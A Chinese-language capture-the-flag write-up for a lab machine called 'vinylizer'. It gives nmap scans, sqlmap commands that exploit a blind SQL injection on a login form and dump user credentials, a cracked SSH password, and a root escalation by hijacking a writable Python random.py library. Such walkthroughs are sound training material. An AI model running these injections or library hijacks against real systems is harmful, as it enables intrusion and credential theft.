---
title: vinylizer
tags:
  - sec
date: 2024-02-10T11:51:04
lastmod: 2025-09-29T20:52:01
toc: "true"
---
## 主机发现
使用 nmap 进行主机发现[[THM_Nmap Live Host Discovery(活动主机发现)]]
```bash
sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
```
![HMM_vinylizer_image_1](https://img.l1uyun.one/HMM_vinylizer_image_1.png)
```bash
192.168.10.10
```
## 端口扫描

![HMM_vinylizer_image_2](https://img.l1uyun.one/HMM_vinylizer_image_2.png)
![HMM_vinylizer_image_3](https://img.l1uyun.one/HMM_vinylizer_image_3.png)


## web 侦查
![HMM_vinylizer_image_4](https://img.l1uyun.one/HMM_vinylizer_image_4.png)

## 利用登录页面的 sql 注入 
sqlmap
```bash
sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login="
```
![HMM_vinylizer_image_5](https://img.l1uyun.one/HMM_vinylizer_image_5.png)
```bash
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7762 FROM (SELECT(SLEEP(5)))rBJA) AND 'mJfQ'='mJfQ&password=admin&login=
---
```
查看所有数据库
```bash
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --dbs
```
![HMM_vinylizer_image_6](https://img.l1uyun.one/HMM_vinylizer_image_6.png)
查看数据库的表信息
```bash
 sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --tables -D vinyl_marketplace
```
![HMM_vinylizer_image_7](https://img.l1uyun.one/HMM_vinylizer_image_7.png)
查看某一个表的列信息
```bash
sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" --columns -D vinyl_marketplace -T users
```
![HMM_vinylizer_image_8](https://img.l1uyun.one/HMM_vinylizer_image_8.png)
查看对应列的信息
```bash
sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" -C username -D vinyl_marketplace -T users --dump

sudo sqlmap http://192.168.10.10/login.php --data "username=admin&password=admin&login=" -C password -D vinyl_marketplace -T users --dump
```
![HMM_vinylizer_image_9](https://img.l1uyun.one/HMM_vinylizer_image_9.png)
![HMM_vinylizer_image_10](https://img.l1uyun.one/HMM_vinylizer_image_10.png)

## 获得立足点
成功登录lana 用户 但是不能 ssh
![HMM_vinylizer_image_11](https://img.l1uyun.one/HMM_vinylizer_image_11.png)

`9432522ed1a8fca612b11c3980a031f6`
![HMM_vinylizer_image_12](https://img.l1uyun.one/HMM_vinylizer_image_12.png)
md5
![HMM_vinylizer_image_13](https://img.l1uyun.one/HMM_vinylizer_image_13.png)

```bash
ssh shopadmin@192.168.10.10

shopadmin:addicted2vinyl
```
## 权限提升_python 库劫持
![HMM_vinylizer_image_14](https://img.l1uyun.one/HMM_vinylizer_image_14.png)
```bash
ls -al /usr/bin/python3
/usr/lib/python3.10/random. py
```
![HMM_vinylizer_image_15](https://img.l1uyun.one/HMM_vinylizer_image_15.png)
实际是使用的 python3.10
将 vinylizer 代码下载到本地之后, 寻找利用点, 但是代码逻辑没有发现能够利用的点
发现使用了 random. py 这个第三方库, 尝试第三方库接吃吃
![HMM_vinylizer_image_16](https://img.l1uyun.one/HMM_vinylizer_image_16.png) 呗
使用 gpt 随便生成一个 random. py 文件
![HMM_vinylizer_image_17|500](https://img.l1uyun.one/HMM_vinylizer_image_17.png)
```bash
# random.py
import os

# 恶意代码
print("Executing malicious code...")
# 例如，在Linux环境下创建一个文件来证明执行成功
os.system('touch /tmp/malicious_code_executed')
```
然后复制到靶机上
![HMM_vinylizer_image_18](https://img.l1uyun.one/HMM_vinylizer_image_18.png)
成功替换
![HMM_vinylizer_image_19](https://img.l1uyun.one/HMM_vinylizer_image_19.png)
执行成功
![HMM_vinylizer_image_20](https://img.l1uyun.one/HMM_vinylizer_image_20.png)
获得一个 suid 的 bash
![HMM_vinylizer_image_21](https://img.l1uyun.one/HMM_vinylizer_image_21.png)
root
![HMM_vinylizer_image_22](https://img.l1uyun.one/HMM_vinylizer_image_22.png)


## 学习wp
```bash
sqlmap
--batch 全自动,不用回答Y
```
![HMM_vinylizer_image_23](https://img.l1uyun.one/HMM_vinylizer_image_23.png) 